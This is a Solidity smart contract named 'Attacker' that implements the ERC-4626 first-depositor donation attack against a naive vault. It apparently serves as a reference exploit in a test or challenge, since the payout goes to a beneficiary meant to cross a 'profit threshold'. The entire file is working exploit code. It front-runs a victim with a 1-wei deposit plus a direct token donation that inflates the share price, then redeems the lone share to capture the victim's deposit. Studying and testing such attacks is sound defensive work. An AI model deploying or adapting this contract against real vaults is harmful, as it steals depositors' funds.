// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IERC4626} from "@openzeppelin/contracts/interfaces/IERC4626.sol";

/// @title Attacker
/// @notice Reference exploit contract for the ERC-4626 donation / first-depositor
///         inflation attack against a naive linear-conversion vault.
///
///         `prepare()` is the front-run: deposit 1 wei of asset (becoming the
///         first depositor and minting exactly 1 share), then directly
///         `transfer` (donate) a large amount of asset to the vault. The
///         donation raises `totalAssets` without minting any shares, so the
///         per-share price is inflated to `1 + donation` per share.
///
///         After the victim's `deposit` lands and mints 0 shares (its assets
///         enter the vault unaccounted), `finish()` redeems the attacker's
///         single share for `1 + donation + victim_deposit`, extracting the
///         victim's deposit as profit.
contract Attacker {
    IERC20 public immutable asset;
    IERC4626 public immutable vault;
    /// @dev EOA that receives the inflated redemption payout (the claimer).
    address public immutable beneficiary;

    constructor(address asset_, address vault_, address beneficiary_) {
        asset = IERC20(asset_);
        vault = IERC4626(vault_);
        beneficiary = beneficiary_;
    }

    /// @notice Front-run the victim: deposit 1 wei (1 share) then donate.
    /// @dev    The contract must already hold `donation + 1` asset tokens.
    function prepare(uint256 donation) external {
        // Deposit 1 wei of asset. With an empty naive vault this mints 1 share
        // 1:1, making this contract the sole first depositor.
        asset.approve(address(vault), 1);
        vault.deposit(1, address(this));

        // Donate: a direct transfer to the vault inflates totalAssets without
        // minting shares. This is the crux of the real-world pre-fix flaw.
        asset.transfer(address(vault), donation);
    }

    /// @notice After the victim's deposit minted 0 shares, redeem the single
    ///         inflated share and send the payout to the beneficiary EOA so its
    ///         asset balance crosses the profit threshold.
    function finish() external {
        uint256 shares = vault.balanceOf(address(this));
        vault.redeem(shares, beneficiary, address(this));
    }
}
